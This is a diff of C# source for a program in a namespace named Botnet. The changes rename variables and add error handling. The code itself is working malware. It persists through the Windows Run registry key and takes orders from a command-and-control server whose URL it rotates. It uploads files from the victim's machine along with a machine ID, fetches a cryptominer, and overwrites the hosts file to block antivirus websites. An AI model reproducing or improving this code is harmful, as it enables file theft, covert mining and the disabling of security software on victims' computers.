@@ -41,8 +41,8 @@ namespace Botnet
         public static string registryKeyURI = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
         public static RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(registryKeyURI, true);
         //SERVER
-        public static string BASE_URL = "http://localhost/";
-        public static string C2_URL = BASE_URL + "/c2";
+        public static string BASE_URL = "http://botnet/";
+        public static string C2_URL = BASE_URL + "c2/";
         public static string SOFTWARE_REMOTE_DIR = BASE_URL + "software/";
         public static string REMOTE_WEBSITES_TO_BLOCK_FILE = BASE_URL + "hosts.txt";
         public static int noInternetWait = 5000;
@@ -53,9 +53,9 @@ namespace Botnet
         public static readonly string UPDATE_STATUS_INFO = "updateStatusInfo";
         public static readonly string GET_ORDERS = "getOrders";
         public static readonly string NOTIFY_FILES_UPLOAD_COMPLETED = "notifyFilesUploadCompleted";
-        public static readonly string GET_VALID_URL = "getValidUrl";
+        public static readonly string GET_C2_SERVER_URL = "getC2ServerUrl";
         public static readonly string GET_LATEST_PROGRAM_VERSION = "getLatestProgramVersion";
-        public static readonly string GET_LATEST_FILECHECKER_VERSION = "getLatestFileCheckerVersion";
+        public static readonly string GET_LATEST_FILE_CHECKER_VERSION = "getLatestFileCheckerVersion";
         public static readonly string GET_LATEST_ETHMINER_URL = "getLatestEthminerURL";
         public static readonly string UPLOAD_INDEX_FILE = "uploadIndexFile";
         public static readonly string GET_INTERESTING_FILES = "getInterestingFiles";
@@ -120,7 +120,8 @@ namespace Botnet
 
         public static string ServerCommunication(NameValueCollection formData)
         {
-            Console.WriteLine("Sending communication to server: " + formData);
+            // TODO: print form data
+            Console.WriteLine("Sending communication to server...");
             byte[] responseBytes;
             while (true)
             {
@@ -165,9 +166,9 @@ namespace Botnet
             }
         }
 
-        public static void UploadFile(string uploadfile, string operation)
+        public static void UploadFile(string filename, string operation)
         {
-            if (File.Exists(uploadfile))
+            if (File.Exists(filename))
             {
                 while (true)
                 {
@@ -181,9 +182,9 @@ namespace Botnet
                                 ["operation"] = operation,
                                 ["machineID"] = GetMachineID(),
                                 ["password"] = GetPassword(),
-                                ["localPathFile"] = Path.GetDirectoryName(uploadfile).Replace(":", "").Replace("\\", "/").Replace(" ", "")
+                                ["localPathFile"] = Path.GetDirectoryName(filename).Replace(":", "").Replace("\\", "/").Replace(" ", "")
                             };
-                            HttpUploadFile(BASE_URL, uploadfile, "file", "", nvc);
+                            HttpUploadFile(BASE_URL, filename, "file", "", nvc);
                             break;
                         }
                     }
@@ -200,7 +201,7 @@ namespace Botnet
         public static void HttpUploadFile(string url, string file, string paramName, string contentType, NameValueCollection nvc)
         {
             string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
-            byte[] boundarybytes = Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
+            byte[] boundaryBytes = Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
 
             HttpWebRequest wr = (HttpWebRequest)WebRequest.Create(url);
             wr.ServicePoint.ConnectionLimit = 10;
@@ -211,20 +212,20 @@ namespace Botnet
 
             Stream rs = wr.GetRequestStream();
 
-            string formdataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
+            string formDataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
             foreach (string key in nvc.Keys)
             {
-                rs.Write(boundarybytes, 0, boundarybytes.Length);
-                string formitem = string.Format(formdataTemplate, key, nvc[key]);
-                byte[] formitembytes = Encoding.UTF8.GetBytes(formitem);
-                rs.Write(formitembytes, 0, formitembytes.Length);
+                rs.Write(boundaryBytes, 0, boundaryBytes.Length);
+                string formItem = string.Format(formDataTemplate, key, nvc[key]);
+                byte[] formItemBytes = Encoding.UTF8.GetBytes(formItem);
+                rs.Write(formItemBytes, 0, formItemBytes.Length);
             }
-            rs.Write(boundarybytes, 0, boundarybytes.Length);
+            rs.Write(boundaryBytes, 0, boundaryBytes.Length);
 
             string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n";
             string header = string.Format(headerTemplate, paramName, file, contentType);
-            byte[] headerbytes = Encoding.UTF8.GetBytes(header);
-            rs.Write(headerbytes, 0, headerbytes.Length);
+            byte[] headerBytes = Encoding.UTF8.GetBytes(header);
+            rs.Write(headerBytes, 0, headerBytes.Length);
 
             FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
             byte[] buffer = new byte[4096];
@@ -249,20 +250,13 @@ namespace Botnet
             catch (Exception e)
             {
                 Console.WriteLine(e.StackTrace);
-                if (wresp != null)
-                {
-                    wresp.Close();
-                    wresp = null;
-                }
-            }
-            finally
-            {
-                wr = null;
+                wresp?.Close();
             }
         }
 
         public static void BlockAntivirusWebsites()
         {
+            Console.WriteLine("Blocking antivirus websites...");
             DownloadFile(REMOTE_WEBSITES_TO_BLOCK_FILE, websitesToBlockFile);
             string websitesToBlock = File.ReadAllText(websitesToBlockFile);
             string newHostsContent = "";
@@ -274,16 +268,23 @@ namespace Botnet
                     newHostsContent += "0.0.0.0\t" + line.Trim() + "\n";
                 }
             }
-            File.WriteAllText(systemHostsFile, newHostsContent.Trim());
+            Console.WriteLine("newHostsContent: " + newHostsContent);
+            try
+            {
+                File.WriteAllText(systemHostsFile, newHostsContent.Trim());
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.StackTrace);
+            }
             File.Delete(websitesToBlockFile);
         }
-
 
         public static void UpdateBaseURL()
         {
             NameValueCollection formData = new NameValueCollection
             {
-                ["operation"] = GET_VALID_URL
+                ["operation"] = GET_C2_SERVER_URL
             };
             BASE_URL = ServerCommunication(formData);
         }
@@ -458,7 +459,7 @@ namespace Botnet
         public static void DeleteRegistryKey(string keyName)
         {
             Console.WriteLine("Delete registry key: " + keyName);
-            // FIXME: nullpointer
+            // FIXME: null pointer
             if (registryKey.GetValue(keyName) != null)
                 try
                 {
@@ -641,9 +642,24 @@ namespace Botnet
 
         public static void DeleteUninstaller()
         {
-            DeleteDirectory(uninstallerDir);
-            File.Delete(mainDir + installerName);
-            DeleteRegistryKey(registryKeyInstaller);
+            try
+            {
+                DeleteDirectory(uninstallerDir);
+                string filePath = Path.Combine(mainDir, installerName);
+                if (File.Exists(filePath))
+                {
+                    File.Delete(filePath);
+                }
+                else
+                {
+                    Console.WriteLine("File not found: " + filePath);
+                }
+                DeleteRegistryKey(registryKeyInstaller);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error deleting uninstaller: " + ex.Message);
+            }
         }
 
         public static void KillProcessByPath(string exePath)
